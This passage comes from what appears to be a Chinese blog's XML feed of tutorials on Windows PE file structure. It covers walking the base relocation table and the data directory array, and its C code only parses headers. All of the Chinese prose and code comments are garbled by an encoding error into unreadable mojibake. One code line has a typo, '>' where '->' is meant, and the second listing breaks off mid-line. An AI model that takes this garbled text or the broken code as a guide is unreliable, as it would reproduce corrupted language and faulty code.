æ­¤16ä½çš„åç§»æ•°æ®ä¼šå¤šå‡º4ä½ï¼Œäºæ˜¯å°±è§„å®šè¿™16ä½é‡Œé¢é«˜4ä½ä¸ºæœ‰æ•ˆä½ï¼Œåªæœ‰å½“é«˜å››ä½ç­‰äº3çš„æ—¶å€™æ‰è¯´æ˜è¿™ä¸ªåœ°å€éœ€è¦é‡å®šä½ï¼Œä½12ä½åˆ™è®°å½•åç§»ã€‚</p><p>å› æ­¤ä¸€ä¸ªéœ€è¦é‡å®šä½çš„åœ°å€å°±åº”è¯¥è¿™æ ·è®¡ç®— <code>if å…·ä½“é¡¹é«˜4ä½ == 3 ï¼šåœ°å€ = VirtualAddress + å…·ä½“é¡¹ä½12ä½</code></p><p>æˆå‘˜SizeOfBlockæ„ä¹‰å°±æ¯”è¾ƒæ˜ç¡®äº†ï¼Œå°±æ˜¯æ•´ä¸ªå—çš„å¤§å°ï¼ŒåŒ…æ‹¬VirtualAddress çš„å››å­—èŠ‚ï¼Œæœ¬èº«SizeOfBlockçš„å››å­—èŠ‚ï¼Œä»¥åŠä¸‹é¢çš„æ‰€æœ‰å…·ä½“é¡¹çš„ä¸¤å­—èŠ‚ã€‚æ‰€ä»¥æœ‰å¤šå°‘ä¸ªå…·ä½“é¡¹å°±åº”è¯¥è¿™æ ·è®¡ç®—ï¼š<code>(SizeOfBlock - 8)/2</code>ï¼Œæ³¨æ„è¿™é‡Œçš„å•ä½éƒ½æ˜¯å­—èŠ‚</p><h2 id="ä»£ç éå†é‡å®šä½è¡¨"><a href="#ä»£ç éå†é‡å®šä½è¡¨" class="headerlink" title="ä»£ç éå†é‡å®šä½è¡¨"></a>ä»£ç éå†é‡å®šä½è¡¨</h2><p>ä»£ç ä¸­æœ‰æ³¨é‡Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>    &#123;<br>        <span class="hljs-keyword">return</span> RVA;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>        <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    SectionHeader +=<span class="hljs-number">1</span>;<br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Relocation_INFO</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//åœ¨ç›®å½•é¡¹ä¸­æ‰¾åˆ°é‡å®šä½è¡¨åœ°å€</span><br>    DWORD Relocation_Table_RVA = OptionalHeader&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>    <span class="hljs-keyword">if</span> (!Relocation_Table_RVA)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This exe has not Relocation Table\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>&#125;<br><br>    <span class="hljs-comment">//å°†é‡å®šä½è¡¨åœ°å€è½¬åŒ–FOA</span><br>    DWORD Relocation_Table_FOA = RVA_TO_FOA(Relocation_Table_RVA,Buffer);<br><br>    <span class="hljs-comment">//æ‰¾åˆ°ç¬¬ä¸€ä¸ªé‡å®šä½è¡¨å—</span><br>    PIMAGE_BASE_RELOCATION Relocation_Table = (PIMAGE_BASE_RELOCATION)(Buffer + Relocation_Table_FOA);<br><br>    <span class="hljs-comment">//éå†æ‰€æœ‰é‡å®šä½è¡¨</span><br>    <span class="hljs-keyword">while</span>(Relocation_Table-&gt;VirtualAddress &amp;&amp; Relocation_Table-&gt;SizeOfBlock)&#123;<br>      <span class="hljs-comment">//å…ˆè½¬ä¸ºbyte*ï¼ŒåŠ 8å­—èŠ‚ï¼Œç„¶åè½¬ä¸ºWord*ï¼Œè¿™é‡Œå°±æ˜¯ä»£è¡¨æ¯ä¸€ä¸ªå…·ä½“é¡¹</span><br>        WORD* Reloc = (WORD*)((byte*)Relocation_Table + <span class="hljs-number">8</span>);<br>        <span class="hljs-comment">//ç®—å‡ºæœ‰å¤šå°‘ä¸ªæ®å…·ä½“é¡¹</span><br>        DWORD AddSize =  (Relocation_Table-&gt;SizeOfBlock - <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>;<br><br>        <span class="hljs-comment">//è¿™é‡Œæ˜¯è®¡ç®—éœ€è¦é‡å®šä½åœ°å€å±äºå“ªä¸€ä¸ªå—ï¼Œå¯åŠ å¯ä¸åŠ </span><br>        <span class="hljs-comment">//********************************Section****************************************</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; FileHeader-&gt;NumberOfSections;i++)&#123;<br>            <span class="hljs-keyword">if</span> (Relocation_Table-&gt;VirtualAddress &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; Relocation_Table-&gt;VirtualAddress &lt; (SectionHeader-&gt;VirtualAddress + SectionHeader-&gt;Misc.VirtualSize))&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=====%s=====\n&quot;</span>,SectionHeader-&gt;Name);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                SectionHeader += <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//********************************Section****************************************</span><br>        <br>        <span class="hljs-comment">//è¿™é‡Œå°±æ˜¯éå†æ‰€æœ‰å…·ä½“é¡¹</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; AddSize; i++)&#123;<br>            <span class="hljs-comment">//é«˜4ä½æ˜¯å¦ä¸º3</span><br>            <span class="hljs-keyword">if</span>((*(Reloc + i) &gt;&gt; <span class="hljs-number">12</span> ) == <span class="hljs-number">3</span>)&#123;<br>                <span class="hljs-comment">//è®¡ç®—éœ€è¦é‡å®šä½åœ°å€çš„RVA</span><br>                DWORD RVA = Relocation_Table-&gt;VirtualAddress + (*(Reloc + i) &amp; <span class="hljs-number">0xfff</span>);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RVA_Address:%X FOA_Address:%X\n&quot;</span>,RVA,RVA_TO_FOA(RVA,Buffer));<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//æ ¹æ®SizeOfBlockæ‰¾åˆ°ä¸‹ä¸€ä¸ªé‡å®šä½è¡¨å—ï¼ŒåŒæ ·ä¹Ÿæ˜¯éœ€è¦å…ˆè½¬ä¸ºbyte*å†è®¡ç®—</span><br>        Relocation_Table = (PIMAGE_BASE_RELOCATION) (((byte*)(Relocation_Table) + Relocation_Table-&gt;SizeOfBlock));<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_Info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br>    <span class="hljs-comment">//å°†æ–‡ä»¶è¯»å–åˆ°ç¨‹åºä¸­</span><br>    <span class="hljs-type">int</span> size = Size(fp);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp);<br><br>    Relocation_INFO(buffer);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè´´ä¸Šæˆ‘çš„ä»£ç è¿è¡Œéƒ¨åˆ†æˆªå›¾</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307090031836.png"></p><p>ä¸å‰é¢çš„è¿›è¡Œå¯¹æ¯”ï¼Œä¼šå‘ç°RVA_AddressåŠ ä¸Šå®é™…ImageBase 0x10000åå°±æ˜¯éœ€è¦é‡å®šä½çš„åœ°å€å•¦ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082351108.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆä¸ƒï¼‰</title>
    <link href="/2023/07/07/PE_6/"/>
    <url>/2023/07/07/PE_6/</url>
    
    <content type="html"><![CDATA[<p>å¯¼å‡ºè¡¨</p><span id="more"></span><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>ç›®å‰æˆ‘ä»¬å·²ç»å®Œæˆå¯¹PEåŸºæœ¬ç»“æ„çš„è§£æï¼Œäº†è§£PEå„ä¸ªå¤´çš„ä¸»è¦æˆå‘˜ï¼Œå¹¶åŸºäºå¯¹è¿™äº›å¤´çš„ç†è§£ï¼Œå¯¹PEæ–‡ä»¶è¿›è¡Œä¸€äº›æ”¹åŠ¨ã€‚å¦‚æœå®Œæˆä¹‹å‰çš„ç»ƒä¹ ï¼Œç›¸ä¿¡ä½ ä¸€å®šå¯¹PEæ–‡ä»¶å¤´çš„ç»„æˆå·²ç»æœ‰äº†æ·±åˆ»çš„è®¤è¯†ï¼Œè€Œä¸”å¯¹äºCè¯­è¨€æŒ‡é’ˆçš„ç†è§£ä¹Ÿä¸€å®šæ·±å…¥ä¸€ä¸ªå±‚æ¬¡ï¼ˆï¼š</p><p>ç„¶è€ŒPEæ–‡ä»¶æœ€ä¸ºå¤æ‚ç»“æ„è¿˜æ²¡æœ‰çœŸæ­£ç°èº«ï¼Œå³é‡å®šä½è¡¨ã€å¯¼å…¥è¡¨ã€å¯¼å‡ºè¡¨ï¼Œè¿™ä¸‰å¼ è¡¨æ¯”ä¹‹å‰æ‰€æœ‰çš„åŠ èµ·æ¥éƒ½è¿˜è¦å¤æ‚ï¼Œå®ƒä»¬ä¹Ÿæ˜¯PEæ–‡ä»¶èƒ½å¤Ÿæ­£å¸¸è¿è¡Œçš„å…³é”®æ‰€åœ¨ï¼Œæ¥ä¸‹æ¥å°±æ…¢æ…¢æ·±å…¥æ¢ç©¶å§</p><h2 id="çŸ¥è¯†é“ºå«"><a href="#çŸ¥è¯†é“ºå«" class="headerlink" title="çŸ¥è¯†é“ºå«"></a>çŸ¥è¯†é“ºå«</h2><p>åœ¨å­¦ä¹ è¿™å‡ å¼ è¡¨ä¹‹å‰è¿˜éœ€è¦ä¸€äº›ä¸ªçŸ¥è¯†çš„é“ºå«</p><h3 id="é™æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥"></a>é™æ€é“¾æ¥</h3><p>å½“æˆ‘ä»¬åœ¨å†™ç¨‹åºçš„æ—¶å€™ï¼Œæ€»ä¼šé¢ä¸´ä»£ç å¤ç”¨çš„é—®é¢˜ï¼Œå¸¸è§çš„è§£å†³åŠæ³•æ˜¯å°†ç›¸å…³å‡½æ•°è¿›è¡Œä¸€ä¸ªå°è£…å•ç‹¬æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œç„¶åå†åœ¨ä¸»å·¥ç¨‹é‡Œé¢ä½¿ç”¨ä¸€ä¸ªå¤´æ–‡ä»¶includeè¿›æ¥</p><p>![](C:\Users\yongrin\Desktop\æˆªå±2023-07-06 14.42.05.png)</p><p>é‚£ä¹ˆè¿™ä¸ªæ—¶å€™ä¼šä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åˆ«äººä¹Ÿæƒ³ç”¨è¿™ä¸ªä»£ç ï¼Œæˆ–è€…å…¶ä»–å·¥ç¨‹ä¹Ÿæƒ³ç”¨è¿™äº›ä»£ç æ€ä¹ˆåŠå‘¢ï¼Œå¯èƒ½ä¼šæƒ³è¯´é‚£æˆ‘ç›´æ¥å¤åˆ¶ä¸€ä»½ä¸å°±å¥½äº†å˜›ã€‚ä½†æ˜¾ç„¶è¿™æ ·ä¸å¤Ÿä¼˜é›…ï¼Œæœ‰æ²¡æœ‰ä¸€ç§æ–¹å¼å¯ä»¥æ‰“åŒ…è¿™äº›ä»£ç ï¼Œç„¶åå…¶ä»–ç¨‹åºç›´æ¥ä½¿ç”¨å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆå½“ç„¶æ˜¯å¯ä»¥çš„ï¼Œå°±æ˜¯æŠŠè¿™äº›ä»£ç æ‰“åŒ…æˆä¸€ä¸ªlibæ–‡ä»¶ï¼Œå…·ä½“æ“ä½œå¯ä»¥çœ‹<a href="https://blog.csdn.net/nnKevi/article/details/122552542">è¿™ç¯‡æ–‡ç« </a>ã€‚è¿™é‡Œæ˜¯ä½¿ç”¨DevC++åˆ›å»ºçš„libæ–‡ä»¶ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ç¼–è¯‘å·¥å…·ï¼Œä½†æ˜¯æˆ‘è§‰å¾—DevC++æ˜¯æ¯”è¾ƒæ–¹ä¾¿çš„ã€‚</p><p>è¿™æ ·å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„å¤ç”¨ä»£ç ï¼Œå¹¶ä¸”åˆ«äººä¹Ÿå¯ä»¥ä½¿ç”¨å•¦</p><h3 id="åŠ¨æ€é“¾æ¥"><a href="#åŠ¨æ€é“¾æ¥" class="headerlink" title="åŠ¨æ€é“¾æ¥"></a>åŠ¨æ€é“¾æ¥</h3><p>é‚£é™æ€é“¾æ¥å¯ä»¥å¦‚æ­¤æ–¹ä¾¿çš„å¤ç”¨ä»£ç ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿæ¯”å¦‚è¯´å‘ç°åœ¨libæ–‡ä»¶é‡Œæœ‰ä¸€ä¸ªå‡½æ•°å†™é”™äº†ï¼Œè¿™æ—¶å€™å°±ä¸å¾—ä¸é‡æ–°ç¼–è¯‘ä¸€ä¸ªlibæ–‡ä»¶ï¼Œç„¶åå¯¹ä½¿ç”¨çš„æ­¤libçš„ç¨‹åºéƒ½éœ€è¦é‡æ–°ç¼–è¯‘ï¼Œè¿™ä¸ªåœ¨å¤§çš„å·¥ç¨‹é‡Œé¢çš„è¿˜æ˜¯ä»£ä»·è¿˜æ˜¯å¾ˆå¤§çš„ã€‚</p><p>å› ä¸ºé™æ€é“¾æ¥å°±ç›¸å½“äºæŠŠlibæ–‡ä»¶é‡Œçš„å‡½æ•°ä¸€è‚¡è„‘å…¨éƒ¨æ€¼è¿›å·¥ç¨‹é‡Œé¢ï¼Œä¸è‡ªå·±å¤åˆ¶ä»£ç å¾—åˆ°çš„ç¨‹åºæ²¡ä»€ä¹ˆä¸¤æ ·ï¼Œç¼–è¯‘å®Œæˆåé‡Œé¢çš„å‡½æ•°å°±ä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚è¿™ä¹Ÿæ˜¯ç§°å…¶ä¸ºé™æ€é“¾æ¥çš„åŸå› ï¼Œä¹Ÿæ˜¯å› ä¸ºä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ‰€ä»¥æ•´ä¸ªç¨‹åºéƒ½éœ€è¦é‡æ–°ç¼–è¯‘ã€‚</p><p>é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§åšæ³•å¯ä»¥åœ¨ä¸æ›´æ”¹å·¥ç¨‹çš„åŒæ—¶ï¼Œå¯¹å…¶ä½¿ç”¨åˆ°çš„å‡½æ•°è¿›è¡Œä¿®æ­£å‘¢ï¼ŸåŠ¨æ€é“¾æ¥å°±æ˜¯è§£å†³æ­¤é—®é¢˜çš„ï¼Œå¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/L_Mu2000/article/details/115418810">è¿™ç¯‡æ–‡ç« </a>åˆ¶ä½œä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“å¹¶å¯¼å‡ºå…¶ä¸­å‡½æ•°ä½¿ç”¨ã€‚</p><h3 id="IMAGE-DATA-DIRECTORY"><a href="#IMAGE-DATA-DIRECTORY" class="headerlink" title="IMAGE_DATA_DIRECTORY"></a>IMAGE_DATA_DIRECTORY</h3><p>å¯é€‰å¤´çš„æœ€åä¸€ä¸ªæˆå‘˜æ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„å­˜å‚¨äº†å„ç§è¡¨çš„çš„åœ°å€ï¼ŒåŒ…æ‹¬å¯¼å‡ºè¡¨ã€å¯¼å…¥è¡¨ã€é‡å®šä½è¡¨ç­‰ã€‚æ¯ä¸€ä¸ªç»“æ„ä½“éƒ½æ˜¯ç›¸åŒçš„ï¼ŒåŒ…å«ä¸¤ä¸ªæˆå‘˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DATA_DIRECTORY</span> &#123;</span><br>DWORDã€€VirtualAddress; <span class="hljs-comment">//ç›¸å¯¹è™šæ‹Ÿåœ°å€</span><br>DWORDã€€Size;ã€€ã€€ã€€ã€€ã€€ <span class="hljs-comment">//å¤§å°</span><br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæˆå‘˜å°±æ˜¯è¯¥è¡¨çš„åœ°å€ï¼Œç¬¬äºŒä¸ªæˆå‘˜å°±è¯¥è¡¨çš„å¤§å°ï¼Œä½†å®é™…ä¸Šæ¯ä¸€å¼ è¡¨éƒ½æœ‰è‡ªå·±ç»Ÿè®¡å¤§å°çš„æ–¹æ³•ï¼Œè¿™ä¸ªSizeå­—æ®µæ²¡æœ‰ç”¨å¤„ï¼Œå¯ä»¥è¢«ä»»æ„ä¿®æ”¹ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307071826259.jpg"></p><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç éå†æ•´ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œå¹¶å¾—åˆ°æ¯ä¸€ä¸ªè¡¨çš„RVA</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Data_Directoy</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span><br>&#123;<br>PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS32 NTHeader = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//è¿™é‡Œç”¨äº†PIMAGE_NT_HEADERS32 å¯¹åº”äº32ä½æ–‡ä»¶ï¼Œå¿…é¡»ä½¿ç”¨</span><br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br><br>    DWORD* Data_Directory = (DWORD*)OptionalHeader-&gt;DataDirectory;<br>    <span class="hljs-type">int</span> number = OptionalHeader-&gt;NumberOfRvaAndSizes;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EXPORT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IMPORT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">2</span>)<br>            <span class="hljs-built_in">printf</span>(<span 